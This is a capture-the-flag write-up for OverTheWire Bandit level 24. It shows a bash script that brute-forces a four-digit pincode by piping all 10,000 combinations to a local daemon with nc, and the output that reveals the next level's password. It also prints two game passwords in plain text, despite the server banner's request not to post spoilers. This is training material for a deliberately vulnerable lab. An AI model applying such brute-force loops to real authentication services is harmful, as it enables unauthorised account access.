# LEVEL GOAL

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

# SOLUTION

`nikhilh@ubuntu:~/projects/overthewire-bandit/bandit24$ ssh -p 2220 bandit24@bandit.labs.overthewire.org`

This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit24@bandit.labs.overthewire.org's password: 
               
      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"  
     \   \ .'        ;   |.'       \   \ ;     
  www. `---` ver     '---' he       '---" ire.org     
               
              
Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames. 
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with 
  easily guessable or short names will be periodically deleted!
	
  Please play nice:
      
    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS! 
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

`bandit24@bandit:~$ mkdir /tmp/kenshin25`

`bandit24@bandit:~$ cd /tmp/kenshin25`

`bandit24@bandit:/tmp/kenshin25$ vim brute.sh`

`bandit24@bandit:/tmp/kenshin25$ cat brute.sh `

`#! /bin/bash`

`pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"`

`echo "" > pass_pin`

`for i in {0000..9999}`

`do`

`    echo $pass $i >> pass_pin`

`done`

`cat pass_pin | nc localhost 30002`

`bandit24@bandit:/tmp/kenshin25$ chmod 777 brute.sh`

`bandit24@bandit:/tmp/kenshin25$ ./brute.sh `

`I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.`

`Fail! You did not supply enough data. Try again.`

`Wrong! Please enter the correct pincode. Try again.`

`Wrong! Please enter the correct pincode. Try again.`

…

…

…

`Wrong! Please enter the correct pincode. Try again.`

`Correct!`

`The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`

`Exiting.`
